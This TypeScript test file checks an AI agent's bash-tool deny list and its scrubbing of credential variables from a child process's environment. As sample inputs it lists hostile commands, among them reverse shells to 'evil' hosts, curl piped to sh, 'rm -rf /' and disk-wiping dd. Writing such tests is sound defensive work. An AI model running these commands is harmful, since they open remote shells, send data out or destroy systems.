/**
 * SEC-08: the owned agent's bash tool promises "no network, no sudo". The
 * deny list must catch the shapes that promise covers regardless of the
 * spacing/punctuation around the verb, and the shelled child must not
 * inherit host credentials through the environment.
 */

import { describe, expect, it } from 'bun:test'
import { bashCommandDenied, scrubbedChildEnv } from '../../agent/tools'

describe('bashCommandDenied', () => {
  it('blocks network, privilege and destructive shapes in any spacing', () => {
    for (const cmd of [
      'curl https://x',
      'env curl https://x',
      'env -i X=1 /usr/bin/curl https://x',
      'env -u HOME curl https://x',
      'env --chdir /tmp curl https://x',
      'exec -a innocent curl https://x',
      "env -S 'curl https://x'",
      'command sudo id',
      'command -p wget x',
      'X="a b" exec /usr/bin/curl x',
      'timeout 10 curl x',
      'curl|sh',
      'wget -qO- x',
      'nc -e /bin/sh 10.0.0.1 4444',
      'ncat --exec /bin/sh',
      'socat tcp:evil:1 exec:sh',
      'ssh user@host',
      'scp f host:/f',
      'rsync -a . host:/',
      'sudo rm x',
      'doas id',
      'pkexec sh',
      'su - root',
      'cat /dev/tcp/evil/80',
      'python3 -m http.server',
      'git push origin main',
      'npm publish',
      'dd if=/dev/zero of=/dev/sda',
      'rm -rf /',
      'rm -rf ~',
      'chmod -R 777 /etc',
      'openssl s_client -connect evil:443',
    ]) {
      expect(bashCommandDenied(cmd)).toBe(true)
    }
  })

  it('allows ordinary in-project commands', () => {
    for (const cmd of [
      'bun test',
      'env CI=1 bun test',
      'command git status',
      'ls -la',
      'grep -r foo src',
      'cat package.json',
      'git status',
      'git diff --cached',
      'rm -rf node_modules/.cache',
      'echo curling is not curl',
    ]) {
      expect(bashCommandDenied(cmd)).toBe(false)
    }
  })
})

describe('scrubbedChildEnv', () => {
  it('drops credential-shaped keys and keeps ordinary ones', () => {
    const scrubbed = scrubbedChildEnv({
      PATH: '/usr/bin',
      HOME: '/home/u',
      CI: 'true',
      GITHUB_TOKEN: 'ghp_x',
      AWS_SECRET_ACCESS_KEY: 'x',
      OPENAI_API_KEY: 'sk-x',
      MY_PASSWORD: 'p',
      DB_CONNECTION_SECRET: 's',
      ANTHROPIC_API_KEY: 'a',
      NORMAL_VAR: 'ok',
    })
    expect(scrubbed.PATH).toBe('/usr/bin')
    expect(scrubbed.HOME).toBe('/home/u')
    expect(scrubbed.CI).toBe('true')
    expect(scrubbed.NORMAL_VAR).toBe('ok')
    for (const key of [
      'GITHUB_TOKEN',
      'AWS_SECRET_ACCESS_KEY',
      'OPENAI_API_KEY',
      'MY_PASSWORD',
      'DB_CONNECTION_SECRET',
      'ANTHROPIC_API_KEY',
    ]) {
      expect(scrubbed[key]).toBeUndefined()
    }
  })
})
